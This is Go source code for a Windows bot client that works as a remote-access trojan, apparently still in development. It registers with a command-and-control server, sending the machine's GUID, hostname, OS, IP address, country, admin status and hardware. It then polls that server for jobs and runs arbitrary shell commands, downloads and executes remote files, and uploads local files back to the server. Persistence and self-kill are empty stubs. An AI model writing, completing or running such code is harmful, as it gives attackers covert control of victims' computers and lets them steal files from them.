package main

import (
	"Worker/system/win"
	"Worker/utils"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"time"
)

const (
	serverAddr = "http://127.0.0.1:5000"

	maxRetries = 10

	minDelay = 5
	maxDelay = 60
)

type RequestType int

const (
	REGISTER RequestType = iota
	HARDWARE
	RETRIEVE
	REPORTS
	UPLOADS
)

type Worker struct {
	id        string
	isAdmin   bool
	boostMode bool // TODO: after new start we need to notify server about disabled boost!
}

type HostInfo struct {
	Id       string `json:"id"`
	Hostname string `json:"hostname"`
	Os       string `json:"os"`
	IpAddr   string `json:"ip_addr"`
	Country  string `json:"country"`
	IsAdmin  bool   `json:"is_admin"`
}

type HardwareInfo struct {
	Gpu string `json:"gpu"`
	Cpu string `json:"cpu"`
	Ram string `json:"ram"`
}

// TODO: check for wrong input?
func buildRequestUrl(reqType RequestType, workerId, jobId string) string {
	baseUrl := serverAddr + "/api/workers/" + workerId
	switch reqType {
	case RETRIEVE:
		return baseUrl + "/jobs/undone"
	case REPORTS:
		return baseUrl + "/jobs/" + jobId + "/report"
	case UPLOADS:
		return baseUrl + "/uploads"
	case HARDWARE:
		return baseUrl + "/hardware"
	case REGISTER:
		return serverAddr + "/api/workers"
	}
	return ""
}

func NewWorker() *Worker {
	uuid, _ := win.GetMachineGuid()
	uuid, _ = utils.UuidStrToBase64Str(uuid)
	return &Worker{
		id:        uuid,
		isAdmin:   win.ProcessHasAdminRights(),
		boostMode: true, // TODO: remove later!
	}
}

// TODO: call this method only if worker not persisted!
func (w *Worker) register() bool {
	hostInfo := HostInfo{Id: w.id, IsAdmin: w.isAdmin}
	hostInfo.Hostname, _ = os.Hostname()
	hostInfo.Os, _ = win.GetOsName()
	hostInfo.IpAddr, hostInfo.Country = utils.GetMyIpCountry()

	reqBody, _ := json.Marshal(hostInfo)
	registerUrl := buildRequestUrl(REGISTER, w.id, "")

	for i := 1; i <= maxRetries; i++ {
		resp, err := http.Post(registerUrl, "application/json", bytes.NewBuffer(reqBody))
		if err == nil {
			resp.Body.Close()
			w.tellHardwareInfo()
			return true
		}
		time.Sleep(time.Minute * time.Duration(i))
	}
	return false
}

func (w *Worker) tellHardwareInfo() {
	hardwareInfo := HardwareInfo{}
	hardwareInfo.Gpu, _ = win.GetGpuName()
	hardwareInfo.Cpu, _ = win.GetCpuName()
	totalRam, _ := win.GetTotalRam()
	hardwareInfo.Ram = utils.ToReadableSize(totalRam)

	reqBody, _ := json.Marshal(hardwareInfo)
	hardwareInfoUrl := buildRequestUrl(HARDWARE, w.id, "")

	resp, err := http.Post(hardwareInfoUrl, "application/json", bytes.NewBuffer(reqBody))
	if err == nil {
		resp.Body.Close()
	}
}

func (w *Worker) poll() {
	jobsUrl := buildRequestUrl(RETRIEVE, w.id, "")
	errorN := 0
	for {
		resp, err := http.Get(jobsUrl)
		if err != nil {
			errorN++
			if errorN == maxRetries {
				w.kill()
				return
			}
			time.Sleep(time.Minute * time.Duration(errorN))
			continue
		}
		errorN = 0
		var jobs []Job
		err = json.NewDecoder(resp.Body).Decode(&jobs)
		if err != nil {
			fmt.Println(err)
			goto end
		}
		// TODO: sort jobs by create time
		if len(jobs) > 1 {
			sortJobsByTime(jobs)
		}
		for _, j := range jobs {
			w.resolve(j)
		}
	end:
		if w.boostMode {
			time.Sleep(time.Duration(minDelay) * time.Second)
		} else {
			time.Sleep(time.Duration(utils.RandomInt(minDelay, maxDelay)) * time.Second)
		}
	}
}

func (w *Worker) resolve(job Job) {
	todo, args := parseJob(job.Todo)
	fmt.Println(job.Todo)
	fmt.Println(job.Created)
	switch todo {
	case SHELL_CMD:
		output, _ := win.ExecuteCommand(args...) // TODO: check for errors and send error message as report
		w.report(job.Id, output)
	case BOOST:
		w.boostMode = args[0] == "on" // TODO: check inside parseJob whether args are correct
		w.report(job.Id, "Boost mode changed.")
	case SLEEP:
		val, err := strconv.Atoi(args[0])
		if err != nil {
			w.report(job.Id, err.Error())
		} else {
			w.report(job.Id, "Sleeping for "+args[0]+" seconds.")
			time.Sleep(time.Duration(val) * time.Second)
		}
	case DOWNLOAD:
		if err := win.DownloadNExecute(args[0], args[1]); err != nil {
			w.report(job.Id, err.Error())
		} else {
			w.report(job.Id, "File downloaded and executed.")
		}
	case UPLOAD:
		filePath := args[0]
		destUrl := buildRequestUrl(UPLOADS, w.id, "")
		if err := utils.UploadFile(filePath, destUrl); err != nil {
			w.report(job.Id, err.Error())
		} else {
			w.report(job.Id, "File uploaded to "+destUrl)
		}
	case UNKNOWN:
		w.report(job.Id, "Received job has wrong format.")
	}
}

func (w *Worker) report(jobId int, rep string) { // TODO: accept only bytes?
	reportUrl := buildRequestUrl(REPORTS, w.id, strconv.Itoa(jobId)) // TODO: change ids to string!!
	resp, err := http.Post(reportUrl, "text/plain;charset=UTF-8", bytes.NewBuffer([]byte(rep)))
	if err == nil {
		resp.Body.Close()
	}
}

func (w *Worker) persist() {

}

func (w *Worker) kill() {

}

func (w *Worker) exists() {

}

func (w *Worker) run() {
	// if !w.persisted()
	// w.persist()
	if ok, _ := win.ProcessAlreadyRunning(); ok {
		return
	}
	if !w.register() {
		w.kill()
	} else {
		w.poll()
	}
}
